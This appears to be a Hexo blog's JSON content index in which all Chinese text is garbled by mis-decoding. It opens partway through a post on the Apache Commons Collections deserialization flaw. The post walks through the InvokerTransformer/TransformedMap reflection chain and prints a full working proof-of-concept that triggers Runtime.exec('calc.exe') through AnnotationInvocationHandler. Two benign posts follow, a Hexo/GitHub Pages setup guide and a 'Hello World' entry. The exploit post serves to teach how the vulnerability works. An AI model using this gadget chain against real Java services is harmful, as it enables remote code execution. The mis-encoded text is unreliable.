äº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetEntrySetç±»ä¸­çš„iteratoræ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iteratoråˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIteratorEntrySetIteratorç±»ä¸­çš„nextæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#nextåˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntryMapEntryç±»ä¸­çš„setValueæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValueç¬¬ä¸€è¡Œè°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œæ­¤å¤„çš„parentæ¥è‡ªæ‰€ä»¥å®žé™…ä¸Šè°ƒç”¨ä¸º org.apache.commons.collections.map.TransformedMap#checkSetValueè°ƒç”¨äº†valueTransformer çš„transformæ–¹æ³•æ‰€ä»¥é¦–å…ˆè°ƒç”¨äº†org.apache.commons.collections.functors.ChainedTransformer#transformå¾ªçŽ¯è°ƒç”¨æ•°ç»„æ¯ä¸€ä¸ªå¯¹è±¡çš„transformæ–¹æ³•ï¼Œå¹¶ä¼ å…¥objectå¯¹è±¡ï¼Œå†å°†æ‰§è¡Œç»“æžœèµ‹å€¼ç»™objectå¯¹è±¡[0]æ˜¯ConstantTransformerå¯¹è±¡ï¼Œå®ƒä¼šè¿”å›žnewæ—¶å€™çš„å‚æ•°ä¸­çš„Objectå¯¹è±¡ï¼Œè¿™é‡Œä¹Ÿæ˜¯å°±æ˜¯â€java.Runtimeâ€[1]-[3]æ˜¯InvokerTransformerå¯¹è±¡ï¼Œè°ƒç”¨çš„æ˜¯åå°„çš„ä»£ç  iTransformersçš„å€¼æ˜¯åœ¨åˆå§‹åŒ–æž„å»ºChainedTransformeræ—¶ç”Ÿæˆorg.apache.commons.collections.functors.ChainedTransformer#ChainedTransformerConstantTransformerç±»ä¸­å®žçŽ°transformæ–¹æ³•org.apache.commons.collections.functors.ConstantTransformer#transformInvokerTransformerç±»ä¸­å®žçŽ°äº†transformæ–¹æ³•org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } (â€œgetMethodâ€, new Class[] {String.class, Class[].class }, new Object[] {â€œgetRuntimeâ€, new Class[0] })iMethodName = â€œgetMethodâ€;iParamTypes = new Class[] {String.class, Class[].class } ;iArgs = new Object[] {â€œgetRuntimeâ€, new Class[0] } 123456789101112public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } ......} ç¬¬ä¸€ä¸ªå‚æ•°â€getMethodâ€æ˜¯è¿™ä¸ªå‡½æ•°çš„åå­— ç¬¬äºŒä¸ªå‚æ•°new Class[]{String.class, Class[].class}æ˜¯getMethodçš„2ä¸ªå‚æ•°å‚æ•°ç±»åž‹ï¼Œä¸€ä¸ªæ˜¯Stringï¼Œä¸€ä¸ªæ˜¯class[] ç¬¬ä¸‰ä¸ªå‚æ•°new Object[]{â€œgetRuntimeâ€, new Class[0]}æ˜¯getMethodçš„2ä¸ªå‚æ•°å€¼ï¼Œä¸€ä¸ªæ˜¯getRuntimeï¼Œä¸€ä¸ªæ˜¯ç©ºï¼Œå› ä¸ºæ˜¯æ•°ç»„å½¢å¼æ‰€ä»¥è¦è¿™ä¹ˆå†™ getMethod(&lt;String&gt; â€œgetRuntimeâ€, &lt;Class[]&gt; null)invoke(&lt;Object&gt;null, &lt;Object[]&gt;null)exec(&lt;String&gt;â€œâ€calc.exeâ€â€) å°±æ˜¯é€šè¿‡åå°„åŽ»è°ƒç”¨Runtime.getRuntime().exec(â€œcalc.exeâ€) Javaåå°„æœºåˆ¶ javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime.getRuntime().exec(\"calc\"); }} æ­£å¸¸çš„æ‰§è¡Œæ­¥éª¤ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime runtime = Runtime.getRuntime(); runtime.exec(\"calc\"); } } ç›¸å¯¹åº”çš„åå°„ä»£ç ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); }} Method Class.getMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)çš„ä½œç”¨æ˜¯èŽ·å¾—å¯¹è±¡æ‰€å£°æ˜Žçš„å…¬å¼€æ–¹æ³•ã€‚è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°nameæ˜¯è¦èŽ·å¾—æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°parameterTypesæ˜¯æŒ‰å£°æ˜Žé¡ºåºæ ‡è¯†è¯¥æ–¹æ³•å½¢å‚ç±»åž‹ã€‚ getMethod(æ–¹æ³•å, æ–¹æ³•ç±»åž‹)Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null);ç­‰ä»·äºŽObject runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(â€œSpeakâ€, null);èŽ·å¾—personå¯¹è±¡çš„Speakæ–¹æ³•ï¼Œå› ä¸ºSpeakæ–¹æ³•æ²¡æœ‰å½¢å‚ï¼Œæ‰€ä»¥parameterTypesä¸ºnull person.getClass().getMethod(â€œrunâ€, String.class);èŽ·å¾—personå¯¹è±¡çš„runæ–¹æ³•ï¼Œå› ä¸ºrunæ–¹æ³•çš„å½¢å‚æ˜¯Stringç±»åž‹çš„ï¼Œæ‰€ä»¥parameterTypesä¸ºString.class Method Class.invoke(Object obj, Objectâ€¦ args)invoke(æŸä¸ªå¯¹è±¡å®žä¾‹ï¼Œ ä¼ å…¥å‚æ•°) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\");ç­‰ä»·äºŽ runtime.exec(\"calc\");è°ƒç”¨ç”Ÿæˆçš„runtimeå®žä¾‹çš„execæ–¹æ³•ï¼Œå¹¶å°†â€clacâ€å‚æ•°ä¼ å…¥exec()æ–¹æ³• å®žé™…åˆ©ç”¨ å¯¹è±¡æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œä½†å¹¶ä¸åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘è°ƒç”¨é“¾ï¼Œè€Œæ˜¯è¦ç»è¿‡è¿­ä»£å™¨è¿­ä»£å¹¶ä¸”ä½¿ç”¨ setValue() æ–¹æ³•æ‰è¡Œï¼Œæ­£å¸¸æƒ…å†µä¸‹åŸºæœ¬ä¸ä¼šæœ‰è¿™ç§åœºæ™¯ã€‚ sun.reflect.annotation.AnnotationInvocationHandlerè¯¥ç±»ä¸­é‡å†™äº†readObjectæ–¹æ³•,åœ¨è¢«è°ƒç”¨æ—¶ä¼šæ‰§è¡ŒsetValueæ“ä½œ, å¦‚æžœèƒ½æŠŠTransformedMapè£…å…¥è¿™ä¸ªAnnotationInvocationHandlerç±»å°±å¯ä»¥å®žçŽ°ä»»æ„ä»£ç æ‰§è¡Œ åˆ©ç”¨ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"value\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //åºåˆ—åŒ– FileOutputStream fileOutputStream = new FileOutputStream(\"serialize3.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //ååºåˆ—åŒ– FileInputStream fileInputStream = new FileInputStream(\"serialize3.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); }} java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ sun.reflect.annotation.AnnotationInvocationHandler#readObject ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° var1 å¿…é¡»ä¸ºç»§æ‰¿Annotationçš„å­ç±»ï¼ŒAnnotationè¿™ä¸ªæŽ¥å£æ˜¯æ‰€æœ‰æ³¨è§£ç±»åž‹çš„å…¬ç”¨æŽ¥å£ï¼Œæ‰€æœ‰æ³¨è§£ç±»åž‹éƒ½å®žçŽ°äº†è¿™ä¸ªæŽ¥å£ã€‚ java.lang.annotation.Retention.class java.lang.annotation.Target.class å¦åˆ™åœ¨è¿™ä¸ªåœ°æ–¹å°±returnï¼Œä¸ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œäº† ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•° var2 åˆ™æ˜¯æž„é€ çš„è°ƒç”¨é“¾åŒæ—¶mapçš„é”®å€¼å¿…é¡»ä¸º\"value\"ï¼Œå¦åˆ™åˆ©ç”¨ä¸æˆåŠŸï¼Œè¿™æ˜¯ä¸€å¤„å°ç»†èŠ‚~ Java ååºåˆ—åŒ–æ¼æ´žå§‹æœ«ï¼ˆ1ï¼‰â€” Apache Commonsæµ…æ˜¾æ˜“æ‡‚çš„JAVAååºåˆ—åŒ–å…¥é—¨æ‰‹æŠŠæ‰‹æ•™ä½ å†™JAVAååºåˆ—åŒ–çš„POC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hexoæ­å»ºä¸ªäººåšå®¢","slug":"Hexoæ­å»ºä¸ªäººåšå®¢","date":"2020-08-15T15:54:00.000Z","updated":"2020-09-25T09:27:01.331Z","comments":true,"path":"2020/08/15/Hexoæ­å»ºä¸ªäººåšå®¢/","link":"","permalink":"http://yoursite.com/2020/08/15/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"æ­å»ºåšå®¢ çŽ¯å¢ƒæ­å»º å®‰è£… Git &amp;&amp; Node.js GitNode.js","text":"æ­å»ºåšå®¢ çŽ¯å¢ƒæ­å»º å®‰è£… Git &amp;&amp; Node.js GitNode.js å®‰è£… Hexo Git å’Œ Node.js å®‰è£…å¥½ä¹‹åŽï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªç”¨äºŽå­˜æ”¾åšå®¢æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼Œè¿›å…¥æ–‡ä»¶å¤¹åŽï¼Œå®‰è£…å¹¶ä½¿ç”¨ Hexo ã€‚ 12$ npm install -g hexo-cli$ hexo init å®‰è£…å®Œæˆä¹‹åŽï¼Œæ–‡ä»¶å¤¹çš„ç›®å½•å¦‚ä¸‹ï¼š |â€”â€”node_modules|â€”â€”public|â€”â€”scaffolds|â€”â€”source|â€”â€”themes|â€”â€”_config.yml|â€”â€”.gitignore|â€”â€”db.json|â€”â€”package.json|â€”â€”package-lock.json ç”Ÿæˆé™æ€åšå®¢æ–‡ä»¶ åœ¨ Git Bash ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 12$ hexo g # ç”Ÿæˆ$ hexo s # å¯åŠ¨æœåŠ¡ åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:4000/ å°†åšå®¢éƒ¨ç½²åˆ° Github ä¸Š åˆ›å»ºä»“åº“ åˆ›å»ºä¸€ä¸ªåä¸ºä½ ç”¨æˆ·å.github.ioçš„ä»“åº“ï¼Œ(å¿…é¡»æ˜¯ç”¨æˆ·åï¼Œå…¶ä»–åç§°æ— æ•ˆ),ä»¥åŽçš„è®¿é—®åœ°å€å°±æ˜¯ http://ç”¨æˆ·å.github.io é…ç½® SSH å¯†é’¥ æŸ¥çœ‹æœ¬æœºæ˜¯å¦å­˜åœ¨ .ssh ç›®å½• 1$ cd ~/.ssh å¦‚æžœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€å¯¹æ–°çš„ SSH å¯†é’¥ 123$ssh-keygen -t rsa -C \"your_email@example.com\" # è¿™å°†æŒ‰ç…§ä½ æä¾›çš„é‚®ç®±åœ°å€ï¼Œåˆ›å»ºä¸€å¯¹å¯†é’¥Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter] æ ¹æ®æç¤ºåˆ°è¾“å…¥å¯†ç å’Œç¡®è®¤å¯†ç  12Enter passphrase (empty for no passphrase): [Type a passphrase]Enter same passphrase again: [Type passphrase again] ç”Ÿæˆ SSH ä¹‹åŽ è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†å…¬é’¥çš„å†…å®¹å¤åˆ¶åˆ°ç³»ç»Ÿç²˜è´´æ¿(clipboard)ä¸­ï¼š 1clip &lt; ~/.ssh/id_rsa.pub ç²˜è´´å…¬é’¥åˆ° github â€“&gt; Settings â€“&gt; SSH keys è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è®¾ç½®æˆåŠŸ 1$ ssh -T git@github.com è®¾ç½®ç”¨æˆ·ä¿¡æ¯ Git ä¼šæ ¹æ®ç”¨æˆ·çš„åå­—å’Œé‚®ç®±æ¥è®°å½•æäº¤ï¼ŒGitHubä¹Ÿæ˜¯ç”¨è¿™äº›ä¿¡æ¯æ¥åšæƒé™çš„å¤„ç†ï¼Œè¾“å…¥ä¸‹é¢çš„ä»£ç è¿›è¡Œä¸ªäººä¿¡æ¯çš„è®¾ç½®ï¼ŒæŠŠåç§°å’Œé‚®ç®±æ›¿ã€‚ 123$ git config --global user.name \"Whippet\" #ç”¨æˆ·å$ git config --global user.email \"Whippet0@qq.com\" #é‚®ç®±$ git config --list #æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ æœ¬åœ°çš„ Hexo æ–‡ä»¶ æ›´æ–°åˆ° Github ç™»é™† Github æ‰¾åˆ°åœ°å€https://github.com/Whippet0/Whippet0.github.io.git å¤åˆ¶è‡³ hexo å®‰è£…ç›®å½•ä¸‹çš„ _config.yml æ–‡ä»¶ä¸­ 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/Whippet0/Whippet0.github.io.git branch: master åœ¨ hexo æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œ 1234$ hexo g$ hexo dæˆ–è€…$ hexo g -d å¦‚æžœ hexo d çš„æ—¶å€™æŠ¥é”™ ERROR Deployer not found: gitæ‰§è¡Œ npm install hexo-deployer-git --save ç„¶åŽéœ€è¦è¾“å…¥ github çš„è´¦å·å’Œå¯†ç  æˆåŠŸä¹‹åŽè®¿é—® https://whippet0.github.io/ ç¾ŽåŒ–åšå®¢ è¿›å…¥ hexo ä¸»é¢˜å®˜ç½‘æŒ‘é€‰æˆ‘ä»¬å–œæ¬¢çš„ä¸»é¢˜ï¼Œå¤åˆ¶ä¸»é¢˜çš„åœ°å€https://github.com/Molunerfinn/hexo-theme-melodyæ‰“å¼€Hexoæ–‡ä»¶å¤¹ æŒ‰ç…§ github ä¸Šçš„æç¤ºè¿›è¡Œæ“ä½œ è‹¥æ²¡æœ‰æç¤ºåˆ™ç›´æŽ¥ git clone è¯¥æ–‡ä»¶å¤¹ã€‚ä¸‹è½½å®ŒæˆåŽï¼Œæ‰“å¼€Hexoæ–‡ä»¶å¤¹ä¸‹çš„é…ç½®æ–‡ä»¶_config.yml ä¿®æ”¹å‚æ•°ä¸ºï¼štheme: melody åœ¨ Git Bash ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 12$ hexo g # ç”Ÿæˆ$ hexo s # å¯åŠ¨æœåŠ¡ åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:4000/åœ¨æœ¬åœ°è¿›è¡ŒæŸ¥çœ‹ éƒ¨ç½²ä¸»é¢˜åˆ°github ä¸Š 12hexo clean (å¿…é¡»è¦ï¼Œä¸ç„¶æœ‰æ—¶å› ä¸ºç¼“å­˜é—®é¢˜ï¼ŒæœåŠ¡å™¨æ›´æ–°ä¸äº†ä¸»é¢˜)hexo g -d æœ€åŽæˆ‘é€‰æ‹©äº†è¿™ä¸ªä¸»é¢˜ stun å› ä¸ºæœ‰é…å¥—çš„ä¸­æ–‡è¯´æ˜Žï¼Œæ‰€ä»¥é…ç½®èµ·æ¥å¾ˆæ–¹ä¾¿ã€‚ åŒæ—¶ä¹Ÿå¯ä»¥è®©åšå®¢ä¸Šæ·»åŠ ä¸€äº› Emoji ðŸ‘´ å‘å¸ƒæ–‡ç«  å›¾ç‰‡é…ç½® åœ¨æ ¹ç›®å½•ä¸‹é…ç½®æ–‡ä»¶_config.yml ä¸­ post_asset_folder: trueå®‰è£…æ’ä»¶ 1$ npm install https://github.com/CodeFalling/hexo-asset-image -- save åˆ©ç”¨ hexo n \"æ–‡ç« åç§°\" åœ¨ source\\_postsä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„æ–‡ç« æ—¶ï¼ŒåŒæ—¶ä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªæ–‡ç« åç§°çš„æ–‡ä»¶å¤¹ï¼ŒæŠŠå›¾ç‰‡æ”¾åœ¨æ–‡ç« åç§°æ–‡ä»¶å¤¹ä¸‹ï¼Œåœ¨ markdown ä¸­åˆ©ç”¨å›¾ç‰‡æ—¶æ˜¯éœ€è¦åŠ ä¸Šæ–‡ä»¶å¤¹çš„ç›®å½•ï¼Œä½†æ˜¯ä¸Šä¼ è‡³ github æ—¶ å¹¶ä¸éœ€è¦æ–‡ä»¶å¤¹çš„ç›®å½•ã€‚ç„¶åŽå°±åˆ©ç”¨ Oah çš„è„šæœ¬ï¼Œè½»æ¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-15T13:31:50.000Z","updated":"2020-09-25T09:27:01.331Z","comments":true,"path":"2020/08/15/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/15/hello-world/","excerpt":"","text":"Hello word ðŸ˜„ ðŸ˜„ ðŸ˜„ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}